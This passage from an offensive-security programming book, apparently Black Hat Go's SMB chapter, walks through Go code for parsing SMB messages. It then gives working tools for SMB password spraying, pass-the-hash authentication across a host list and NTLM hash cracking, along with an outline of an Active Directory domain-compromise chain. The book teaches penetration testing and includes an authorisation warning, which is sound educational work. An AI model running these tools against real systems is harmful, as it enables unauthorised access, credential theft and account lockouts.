            Parent:     v,&#13;
            ParentBuf:  buf,&#13;
            Offsets:    make(map[string]uint64),&#13;
            CurrOffset: 0,&#13;
    }&#13;
    for i := 0; i &lt; typev.NumField(); i++ { <span class="ent">❷</span>&#13;
        m.CurrField = typev.Field(i).Name<span class="ent">❸</span>&#13;
        tags, err := parseTags(typev.Field(i))<span class="ent">❹</span>&#13;
        if err != nil {&#13;
            return nil, err&#13;
        }&#13;
        m.Tags = tags&#13;
        var data interface{}&#13;
        switch typev.Field(i).Type.Kind() { <span class="ent">❺</span>&#13;
            case reflect.Struct:&#13;
                data, err = unmarshal(buf[m.CurrOffset:], valuev.Field(i).Addr().Interface(), m)<span class="ent">❻</span>&#13;
            default:&#13;
                data, err = unmarshal(buf[m.CurrOffset:], valuev.Field(i).Interface(), m)<span class="ent">❼</span>&#13;
        }&#13;
        if err != nil {&#13;
            return nil, err&#13;
        }&#13;
        valuev.Field(i).Set(reflect.ValueOf(data)) <span class="ent">❽</span>&#13;
    }&#13;
<span epub:type="pagebreak" id="page_143"/>    v = reflect.Indirect(reflect.ValueOf(v)).Interface()&#13;
    meta.CurrOffset += m.CurrOffset <span class="ent">❾</span>&#13;
    return v, nil</pre>&#13;
<p class="caption" id="ch6list9"><em>Listing 6-9: Unmarshaling a struct type (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/encoder/encoder.go">/ch-6/smb/smb/encoder/encoder.go</a><em>)</em></p>&#13;
<p class="indent">The <code>case</code> block begins by defining a new <code>Metadata</code> object <span class="ent">❶</span>, a type used to track relevant metadata, including the current buffer offset, field tags, and other information. Using our type variable, we call the <code>NumField()</code> method to retrieve the number of fields within the struct <span class="ent">❷</span>. It returns an integer value that acts as the constraint for a loop.</p>&#13;
<p class="indent">Within the loop, we can extract the current field through a call to the type’s <code>Field(index int)</code> method. The method returns a <code>reflect.StructField</code> type. You’ll see we use this method a few times throughout this code snippet. Think of it as retrieving an element from a slice by index value. Our first usage <span class="ent">❸</span> retrieves the field to extract the field’s name. For example, <code>SecurityBufferOffset</code> and <code>SecurityBlob</code> are field names within the <code>NegotiateRes</code> struct defined in <a href="ch06.xhtml#ch6list6">Listing 6-6</a>. The field name is assigned to the <code>CurrField</code> property of our <code>Metadata</code> object. The second call to the <code>Field(index int)</code> method is inputted to the <code>parseTags()</code> function <span class="ent">❹</span> from <a href="ch06.xhtml#ch6list7">Listing 6-7</a>. We know this function parses our struct field tags. The tags are included in our <code>Metadata</code> object for later tracking and usage.</p>&#13;
<p class="indent">Next, we use a <code>switch</code> statement to act specifically on the field type <span class="ent">❺</span>. There are only two cases. The first handles instances where the field itself is a struct <span class="ent">❻</span>, in which case, we make a recursive call to the <code>unmarshal()</code> function, passing to it a pointer to the field as an interface. The second case handles all other kinds (primitives, slices, and so on), recursively calling the <code>unmarshal()</code> function and passing it the field itself as an interface <span class="ent">❼</span>. Both calls do some funny business to advance the buffer to start at our current offset. Our recursive call eventually returns an <code>interface{}</code>, which is a type that contains our unmarshaled data. We use reflection to set our current field’s value to the value of this interface data <span class="ent">❽</span>. Lastly, we advance our current offset in the buffer <span class="ent">❾</span>.</p>&#13;
<p class="indent">Yikes! Can you see how this can be a challenge to develop? We have a separate case for every kind of input. Luckily, the <code>case</code> block that handles a struct is the most complicated.</p>&#13;
<h5 class="h5">Handling uint16</h5>&#13;
<p class="noindent">If you are really paying attention, you’re probably asking: where do you actually read data from the buffer? The answer is nowhere in <a href="ch06.xhtml#ch6list9">Listing 6-9</a>. Recall that we are making recursive calls to the <code>unmarshal()</code> function, and each time, we pass the inner fields to the function. Eventually we’ll reach primitive data types. After all, at some point, the innermost nested structs are composed of basic data types. When we encounter a basic data type, our code will match against a different case in the outermost <code>switch</code> statement. For example, when we encounter a <code>uint16</code> data type, this code executes the <code>case</code> block in <a href="ch06.xhtml#ch6list10">Listing 6-10</a>.</p>&#13;
<pre><span epub:type="pagebreak" id="page_144"/>case reflect.Uint16:&#13;
    var ret uint16&#13;
    if err := binary.Read(r, binary.LittleEndian, &amp;ret)<span class="ent">❶</span>; err != nil {&#13;
        return nil, err&#13;
    }&#13;
    if meta.Tags.Has("len")<span class="ent">❷</span> {&#13;
        ref, err := meta.Tags.GetString("len")<span class="ent">❸</span>&#13;
        if err != nil {&#13;
            return nil, err&#13;
        }&#13;
        meta.Lens[ref]<span class="ent">❹</span> = uint64(ret)&#13;
    }&#13;
 <span class="ent">❺</span> meta.CurrOffset += uint64(binary.Size(ret))&#13;
    return ret, nil</pre>&#13;
<p class="caption" id="ch6list10"><em>Listing 6-10: Unmarshaling <code>uint16</code> data (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/encoder/encoder.go">/ch-6/smb/smb/encoder/encoder.go/</a><em>)</em></p>&#13;
<p class="indent">In this <code>case</code> block, we make a call to <code>binary.Read()</code> in order to read data from our buffer into a variable, <code>ret</code> <span class="ent">❶</span>. This function is smart enough to know how many bytes to read, based off the type of the destination. In this case, <code>ret</code> is a <code>uint16</code>, so 2 bytes are read.</p>&#13;
<p class="indent">Next, we check whether the <code>len</code> field tag is present <span class="ent">❷</span>. If it is, we retrieve the value—that is, a field name—tied to that key <span class="ent">❸</span>. Recall that this value will be a field name to which the current field is expected to refer. Because the length-identifying fields precede the actual data in the SMB messages, we don’t know where the buffer data actually resides, and so we can’t take any action yet.</p>&#13;
<p class="indent">We’ve just acquired length metadata, and there’s no better place to store it than in our <code>Metadata</code> object. We store it within a <code>map[string]uint64</code> that maintains a relationship of reference field names to their lengths <span class="ent">❹</span>. Phrased another way, we now know how long a variable-length byte slice needs to be. We advance the current offset by the size of the data we just read <span class="ent">❺</span>, and return the value read from the buffer.</p>&#13;
<p class="indent">Similar logic and metadata tracking happen in the process of handling the <code>offset</code> tag information, but we omitted that code for brevity.</p>&#13;
<h5 class="h5">Handling Slices</h5>&#13;
<p class="noindent">In <a href="ch06.xhtml#ch6list11">Listing 6-11</a>, you can see the <code>case</code> block that unmarshals slices, which we need to account for both fixed- and variable-length data while using tags and metadata in the process.</p>&#13;
<pre>case reflect.Slice, reflect.Array:&#13;
    switch typev.Elem().Kind()<span class="ent">❶</span> {&#13;
    case reflect.Uint8:&#13;
        var length, offset int <span class="ent">❷</span>&#13;
        var err error&#13;
        if meta.Tags.Has("fixed") {&#13;
            if length, err = meta.Tags.GetInt("fixed")<span class="ent">❸</span>; err != nil {&#13;
                return nil, err&#13;
            }&#13;
<span epub:type="pagebreak" id="page_145"/>            // Fixed length fields advance current offset&#13;
            meta.CurrOffset += uint64(length) <span class="ent">❹</span>&#13;
        } else {&#13;
            if val, ok := meta.Lens[meta.CurrField]<span class="ent">❺</span>; ok {&#13;
                length = int(val)&#13;
            } else {&#13;
                return nil, errors.New("Variable length field missing length reference in struct")&#13;
            }&#13;
            if val, ok := meta.Offsets[meta.CurrField]<span class="ent">❻</span>; ok {&#13;
                offset = int(val)&#13;
            } else {&#13;
                // No offset found in map. Use current offset&#13;
                offset = int(meta.CurrOffset)&#13;
            }&#13;
            // Variable length data is relative to parent/outer struct.&#13;
            // Reset reader to point to beginning of data&#13;
            r = bytes.NewBuffer(meta.ParentBuf[offset : offset+length])&#13;
            // Variable length data fields do NOT advance current offset.&#13;
        }&#13;
        data := make([]byte, length) <span class="ent">❼</span>&#13;
        if err := binary.Read(r, binary.LittleEndian, &amp;data)<span class="ent">❽</span>; err != nil {&#13;
            return nil, err&#13;
        }&#13;
        return data, nil</pre>&#13;
<p class="caption" id="ch6list11"><em>Listing 6-11: Unmarshaling fixed- and variable-length byte slices (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/encoder/encoder.go/">/ch-6/smb/smb/encoder/encoder.go/</a><em>)</em></p>&#13;
<p class="indent">First, we use reflection to determine the slice’s element type <span class="ent">❶</span>. For example, handling of <code>[]uint8</code> is different from <code>[]uint32</code>, as the number of bytes per element differs. In this case, we’re handling only <code>[]uint8</code> slices. Next, we define a couple of local variables, <code>length</code> and <code>offset</code>, to use for tracking the length of the data to read and the offset within the buffer from which to begin reading <span class="ent">❷</span>. If the slice is defined with the <code>fixed</code> tag, we retrieve the value and assign it to <code>length</code> <span class="ent">❸</span>. Recall that the tag value for the <code>fixed</code> key is an integer that defines the length of the slice. We’ll use this length to advance the current buffer offset for future reads <span class="ent">❹</span>. For fixed-length fields, the <code>offset</code> is left as its default value—zero—since it will always appear at the current offset. Variable-length slices are slightly more complex because we retrieve both the length <span class="ent">❺</span> and offset <span class="ent">❻</span> information from our <code>Metadata</code> structure. A field uses its own name as the key for the lookup of the data. Recall how we populated this information previously. With our <code>length</code> and <code>offset</code> variables properly set, we then create a slice of the desired length <span class="ent">❼</span> and use it in a call to <code>binary.Read()</code> <span class="ent">❽</span>. Again, this function is smart enough to read bytes up until our destination slice has been filled.</p>&#13;
<p class="indent">This has been an exhaustingly detailed journey into the dark recesses of custom tags, reflection, and encoding with a hint of SMB. Let’s move beyond this ugliness and do something useful with the SMB library. Thankfully, the following use cases should be significantly less complicated.</p>&#13;
<h3 class="h3" id="ch6lev1sec3"><span epub:type="pagebreak" id="page_146"/>Guessing Passwords with SMB</h3>&#13;
<p class="noindent">The first SMB case we’ll examine is a fairly common one for attackers and pen testers: online password guessing over SMB. You’ll try to authenticate to a domain by providing commonly used usernames and passwords. Before diving in, you’ll need to grab the SMB package with the following <code>get</code> command:</p>&#13;
<pre>$ <span class="codestrong1">go get github.com/bhg/ch-6/smb</span></pre>&#13;
<p class="indent">Once the package is installed, let’s get to coding. The code you’ll create (shown in <a href="ch06.xhtml#ch6list12">Listing 6-12</a>) accepts a file of newline-separated usernames, a password, a domain, and target host information as command line arguments. To avoid locking accounts out of certain domains, you’ll attempt a single password across a list of users rather than attempt a list of passwords across one or more users.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="notes">WARNING</span></strong></p>&#13;
<p class="notep"><em>Online password guessing can lock accounts out of a domain, effectively resulting in a denial-of-service attack. Take caution when testing your code and run this against only systems on which you’re authorized to test.</em></p>&#13;
</div>&#13;
<pre>func main() {&#13;
    if len(os.Args) != 5 {&#13;
        log.Fatalln("Usage: main &lt;/user/file&gt; &lt;password&gt; &lt;domain&gt;&#13;
        &lt;target_host&gt;")&#13;
    }&#13;
&#13;
    buf, err := ioutil.ReadFile(os.Args[1])&#13;
    if err != nil {&#13;
        log.Fatalln(err)&#13;
    }&#13;
    options := smb.Options<span class="ent">❶</span>{&#13;
        Password: os.Args[2],&#13;
        Domain:   os.Args[3],&#13;
        Host:     os.Args[4],&#13;
        Port:     445,&#13;
    }&#13;
&#13;
    users := bytes.Split(buf, []byte{'\n'})&#13;
    for _, user := range users<span class="ent">❷</span> {&#13;
     <span class="ent">❸</span> options.User = string(user)&#13;
        session, err := smb.NewSession(options, false)<span class="ent">❹</span>&#13;
        if err != nil {&#13;
            fmt.Printf("[-] Login failed: %s\\%s [%s]\n",&#13;
                options.Domain,&#13;
                options.User,&#13;
                options.Password)&#13;
            continue&#13;
        }&#13;
<span epub:type="pagebreak" id="page_147"/>        defer session.Close()&#13;
        if session.IsAuthenticated<span class="ent">❺</span> {&#13;
            fmt.Printf("[+] Success     : %s\\%s [%s]\n",&#13;
                options.Domain,&#13;
                options.User,&#13;
                options.Password)&#13;
        }&#13;
    }&#13;
}</pre>&#13;
<p class="caption" id="ch6list12"><em>Listing 6-12: Leveraging the SMB package for online password guessing (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-6/password-guessing/main.go">/ch-6/password-guessing/main.go</a><em>)</em></p>&#13;
<p class="indent">The SMB package operates on sessions. To establish a session, you first initialize an <code>smb.Options</code> instance that will contain all your session options, including target host, user, password, port, and domain <span class="ent">❶</span>. Next, you loop through each of your target users <span class="ent">❷</span>, setting the <code>options.User</code> value appropriately <span class="ent">❸</span>, and issue a call to <code>smb.NewSession()</code> <span class="ent">❹</span>. This function does a lot of heavy lifting for you behind the scenes: it negotiates both the SMB dialect and authentication mechanism, and then authenticates to the remote target. The function will return an error if authentication fails, and a boolean <code>IsAuthenticated</code> field on the <code>session</code> struct is populated based off the outcome. It will then check the value to see whether the authentication succeeded, and if it did, display a success message <span class="ent">❺</span>.</p>&#13;
<p class="indent">That is all it takes to create an online password-guessing utility.</p>&#13;
<h3 class="h3" id="ch6lev1sec4">Reusing Passwords with the Pass-the-Hash Technique</h3>&#13;
<p class="noindent">The <em>pass-the-hash</em> technique allows an attacker to perform SMB authentication by using a password’s NTLM hash, even if the attacker doesn’t have the cleartext password. This section walks you through the concept and shows you an implementation of it.</p>&#13;
<p class="indent">Pass-the-hash is a shortcut to a typical <em>Active Directory domain compromise</em>, a type of attack in which attackers gain an initial foothold, elevate their privileges, and move laterally throughout the network until they have the access levels they need to achieve their end goal. Active Directory domain compromises generally follow the roadmap presented in this list, assuming they take place through an exploit rather than something like password guessing:</p>&#13;
<ol>&#13;
<li><p class="noindent">The attacker exploits the vulnerability and gains a foothold on the network.</p></li>&#13;
<li><p class="noindent">The attacker elevates privileges on the compromised system.</p></li>&#13;
<li><p class="noindent">The attacker extracts hashed or cleartext credentials from LSASS.</p></li>&#13;
<li><p class="noindent">The attacker attempts to recover the local administrator password via offline cracking.</p></li>&#13;
<li><p class="noindent"><span epub:type="pagebreak" id="page_148"/>The attacker attempts to authenticate to other machines by using the administrator credentials, looking for reuse of the password.</p></li>&#13;
<li><p class="noindent">The attacker rinses and repeats until the domain administrator or other target has been compromised.</p></li>&#13;
</ol>&#13;
<p class="indent">With NTLMSSP authentication, however, even if you fail to recover the cleartext password during step 3 or 4, you can proceed to use the password’s NTLM hash for SMB authentication during step 5—in other words, passing the hash.</p>&#13;
<p class="indent">Pass-the-hash works because it separates the hash calculation from the challenge-response token calculation. To see why this is, let’s look at the following two functions, defined by the NTLMSSP specification, pertaining to the cryptographic and security mechanisms used for authentication:</p>&#13;
<p class="noindentf"><strong>NTOWFv2</strong> A cryptographic function that creates an MD5 HMAC by using the username, domain, and password values. It generates the NTLM hash value.</p>&#13;
<p class="noindentf"><strong>ComputeResponse</strong> A function that uses the NTLM hash in combination with the message’s client and server challenges, timestamp, and target server name to produce a GSS-API security token that can be sent for authentication.</p>&#13;
<p class="indent">You can see the implementations of these functions in <a href="ch06.xhtml#ch6list13">Listing 6-13</a>.</p>&#13;
<pre>func Ntowfv2(pass, user, domain string) []byte {&#13;
    h := hmac.New(md5.New, Ntowfv1(pass))&#13;
    h.Write(encoder.ToUnicode(strings.ToUpper(user) + domain))&#13;
    return h.Sum(nil)&#13;
}&#13;
&#13;
func ComputeResponseNTLMv2(nthash<span class="ent">❶</span>, lmhash, clientChallenge, serverChallenge, timestamp,&#13;
                           serverName []byte) []byte {&#13;
&#13;
    temp := []byte{1, 1}&#13;
    temp = append(temp, 0, 0, 0, 0, 0, 0)&#13;
    temp = append(temp, timestamp...)&#13;
    temp = append(temp, clientChallenge...)&#13;
    temp = append(temp, 0, 0, 0, 0)&#13;
    temp = append(temp, serverName...)&#13;
    temp = append(temp, 0, 0, 0, 0)&#13;
&#13;
    h := hmac.New(md5.New, nthash)&#13;
    h.Write(append(serverChallenge, temp...))&#13;
    ntproof := h.Sum(nil)&#13;
    return append(ntproof, temp...)&#13;
}</pre>&#13;
<p class="caption" id="ch6list13"><em>Listing 6-13: Working with NTLM hashes (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/ntlmssp/crypto.go">/ch-6/smb/ntlmssp/crypto.go</a><em>)</em></p>&#13;
<p class="indent">The NTLM hash is supplied as input to the <code>ComputeResponseNTLMv2</code> function <span class="ent">❶</span>, meaning the hash has been created independently of the logic used for security token creation. This implies that hashes stored <span epub:type="pagebreak" id="page_149"/>anywhere—even in LSASS—are considered precalculated, because you don’t need to supply the domain, user, or password as input. The authentication process is as follows:</p>&#13;
<ol>&#13;
<li><p class="noindent">Calculate the user’s hash by using the domain, user, and password values.</p></li>&#13;
<li><p class="noindent">Use the hash as input to calculate authentication tokens for NTLMSSP over SMB.</p></li>&#13;
</ol>&#13;
<p class="indent">Since you already have a hash in hand, you’ve already completed step 1. To pass the hash, you initiate your SMB authentication sequence, as you defined it way back in the opening sections of this chapter. However, you never calculate the hash. Instead, you use the supplied value as the hash itself.</p>&#13;
<p class="indent"><a href="ch06.xhtml#ch6list14">Listing 6-14</a> shows a pass-the-hash utility that uses a password hash to attempt to authenticate as a specific user to a list of machines.</p>&#13;
<pre>func main() {&#13;
    if len(os.Args) != 5 {&#13;
        log.Fatalln("Usage: main &lt;target/hosts&gt; &lt;user&gt; &lt;domain&gt; &lt;hash&gt;")&#13;
    }&#13;
&#13;
    buf, err := ioutil.ReadFile(os.Args[1])&#13;
    if err != nil {&#13;
        log.Fatalln(err)&#13;
    }&#13;
&#13;
    options := smb.Options{&#13;
        User:   os.Args[2],&#13;
        Domain: os.Args[3],&#13;
        Hash<span class="ent">❶</span>: os.Args[4],&#13;
        Port:   445,&#13;
    }&#13;
&#13;
    targets := bytes.Split(buf, []byte{'\n'})&#13;
    for _, target := range targets<span class="ent">❷</span> {&#13;
        options.Host = string(target)&#13;
&#13;
        session, err := smb.NewSession(options, false)&#13;
        if err != nil {&#13;
            fmt.Printf("[-] Login failed [%s]: %s\n", options.Host, err)&#13;
            continue&#13;
        }&#13;
        defer session.Close()&#13;
        if session.IsAuthenticated {&#13;
            fmt.Printf("[+] Login successful [%s]\n", options.Host)&#13;
        }&#13;
    }&#13;
}</pre>&#13;
<p class="caption" id="ch6list14"><em>Listing 6-14: Passing the hash for authentication testing (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-6/password-reuse/main.go">/ch-6/password-reuse/main.go</a><em>)</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_150"/>This code should look similar to the password-guessing example. The only significant differences are that you’re setting the <code>Hash</code> field of <code>smb.Options</code> (not the <code>Password</code> field) <span class="ent">❶</span> and you’re iterating over a list of target hosts (rather than target users) <span class="ent">❷</span>. The logic within the <code>smb.NewSession()</code> function will use the hash value if populated within the <code>options</code> struct.</p>&#13;
<h3 class="h3" id="ch6lev1sec5">Recovering NTLM Passwords</h3>&#13;
<p class="noindent">In some instances, having only the password hash will be inadequate for your overall attack chain. For example, many services (such as Remote Desktop, Outlook Web Access, and others) don’t allow hash-based authentication, because it either isn’t supported or isn’t a default configuration. If your attack chain requires access to one of these services, you’ll need a cleartext password. In the following sections, you’ll walk through how hashes are calculated and how to create a basic password cracker.</p>&#13;
<h4 class="h4" id="ch6lev2sec6">Calculating the Hash</h4>&#13;
<p class="noindent">In <a href="ch06.xhtml#ch6list15">Listing 6-15</a>, you perform the magic of calculating the hash.</p>&#13;
<pre>func NewAuthenticatePass(domain, user, workstation, password string, c Challenge) Authenticate&#13;
{&#13;
    // Assumes domain, user, and workstation are not unicode&#13;
    nthash := Ntowfv2(password, user, domain)&#13;
    lmhash := Lmowfv2(password, user, domain)&#13;
    return newAuthenticate(domain, user, workstation, nthash, lmhash, c)&#13;
}&#13;
&#13;
func NewAuthenticateHash(domain, user, workstation, hash string, c Challenge) Authenticate {&#13;
    // Assumes domain, user, and workstation are not unicode&#13;
    buf := make([]byte, len(hash)/2)&#13;
    hex.Decode(buf, []byte(hash))&#13;
    return newAuthenticate(domain, user, workstation, buf, buf, c)&#13;
}</pre>&#13;
<p class="caption" id="ch6list15"><em>Listing 6-15: Calculating hashes (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/ntlmssp/ntlmssp.go/">/ch-6/smb/ntlmssp/ntlmssp.go</a><em>)</em></p>&#13;
<p class="indent">The logic to call the appropriate function is defined elsewhere, but you’ll see that the two functions are similar. The real difference is that password-based authentication in the <code>NewAuthenticatePass()</code> function computes the hash before generating the authentication message, whereas the <code>NewAuthenticateHash()</code> function skips that step and uses the supplied hash directly as input to generate the message.</p>&#13;
<h4 class="h4" id="ch6lev2sec7">Recovering the NTLM Hash</h4>&#13;
<p class="noindent">In <a href="ch06.xhtml#ch6list16">Listing 6-16</a>, you can see a utility that recovers a password by cracking a supplied NTLM hash.</p>&#13;
<pre>func main() {&#13;
    if len(os.Args) != 5 {&#13;
<span epub:type="pagebreak" id="page_151"/>        log.Fatalln("Usage: main &lt;dictionary/file&gt; &lt;user&gt; &lt;domain&gt; &lt;hash&gt;")&#13;
    }&#13;
&#13;
    hash := make([]byte, len(os.Args[4])/2)&#13;
    _, err := hex.Decode(hash, []byte(os.Args[4]))<span class="ent">❶</span>&#13;
    if err != nil {&#13;
        log.Fatalln(err)&#13;
    }&#13;
&#13;
    f, err := ioutil.ReadFile(os.Args[1])&#13;
    if err != nil {&#13;
        log.Fatalln(err)&#13;
    }&#13;
&#13;
    var found string&#13;
    passwords := bytes.Split(f, []byte{'\n'})&#13;
    for _, password := range passwords<span class="ent">❷</span> {&#13;
        h := ntlmssp.Ntowfv2(string(password), os.Args[2], os.Args[3]) <span class="ent">❸</span>&#13;
        if bytes.Equal(hash, h)<span class="ent">❹</span> {&#13;
            found = string(password)&#13;
            break&#13;
        }&#13;
    }&#13;
    if found != "" {&#13;
        fmt.Printf("[+] Recovered password: %s\n", found)&#13;
    } else {&#13;
        fmt.Println("[-] Failed to recover password")&#13;
    }&#13;
}</pre>&#13;
<p class="caption" id="ch6list16"><em>Listing 6-16: NTLM hash cracking (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-6/password-recovery/main.go">/ch-6/password-recovery/main.go</a><em>)</em></p>&#13;
<p class="indent">The utility reads the hash as a command line argument, decoding it to a <code>[]byte</code> <span class="ent">❶</span>. Then you loop over a supplied password list <span class="ent">❷</span>, calculating the hash of each entry by calling the <code>ntlmssp.Ntowfv2()</code> function we discussed previously <span class="ent">❸</span>. Finally, you compare the calculated hash with that of our supplied value <span class="ent">❹</span>. If they match, you have a hit and break out of the loop.</p>&#13;
<h3 class="h3" id="ch6lev1sec6">Summary</h3>&#13;
<p class="noindent">You’ve made it through a detailed examination of SMB, touching on protocol specifics, reflection, structure field tags, and mixed encoding! You also learned how pass-the-hash works, as well as a few useful utility programs that leverage the SMB package.</p>&#13;
<p class="indent">To continue your learning, we encourage you to explore additional SMB communications, particularly in relation to remote code execution, such as PsExec. Using a network sniffer, such as Wireshark, capture the packets and evaluate how this functionality works.</p>&#13;
<p class="indent">In the next chapter, we move on from network protocol specifics to focus on attacking and pillaging databases.<span epub:type="pagebreak" id="page_152"/></p>&#13;
</div>



  </body></html>